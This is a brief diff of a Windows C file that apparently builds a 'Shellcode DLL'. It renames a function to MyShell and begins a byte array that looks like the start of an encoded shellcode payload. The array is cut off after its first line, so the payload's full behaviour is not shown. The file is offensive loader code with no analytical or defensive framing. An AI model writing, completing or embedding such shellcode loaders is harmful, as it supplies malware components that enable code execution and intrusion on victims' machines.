@@ -1,9 +1,9 @@
 #include <Windows.h>
 #include <stdio.h>
 
-int WINAPI MyFunc()
+int WINAPI MyShell()
 {
-	MessageBox(0, "MyFunc", "Shellcode DLL",  MB_OK | MB_ICONINFORMATION);
+	MessageBox(0, "MyShell", "Shellcode DLL",  MB_OK | MB_ICONINFORMATION);
 	
 	const char code[] = 
 	"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff"
